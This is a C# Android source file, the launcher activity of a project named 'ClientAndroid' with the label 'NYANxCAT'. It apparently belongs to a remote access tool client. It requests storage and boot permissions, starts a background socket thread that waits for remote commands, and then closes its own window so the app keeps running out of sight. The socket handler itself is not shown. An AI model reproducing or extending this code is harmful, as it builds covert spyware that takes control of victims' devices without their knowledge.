using Android.App;
using Android.OS;
using Android.Support.V7.App;
using System.Threading;
using ClientAndroid.Project;
using Android;
using Android.Content;
using System;
using Android.Widget;

namespace ClientAndroid
{
    [Activity(Label = "NYANxCAT", Theme = "@style/AppTheme", MainLauncher = true)]
    public class MainActivity : AppCompatActivity
    {
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);

            // Set our view from the "main" layout resource
            SetContentView(Resource.Layout.activity_main);

            RequestPermissions(new string[] { 
                Manifest.Permission.ReadExternalStorage, 
                Manifest.Permission.WriteExternalStorage, 
                Manifest.Permission.ReceiveBootCompleted }, 00);
           
            // Socket thread
            new Thread(new ThreadStart(delegate
            {
                if (SocketClient.GetMainActivity != null) return;
                SocketClient.GetMainActivity = this;
                SocketClient.ReceiveHeader();
            }))
            { IsBackground = false }.Start();

            this.FinishAffinity();
        }
    }
}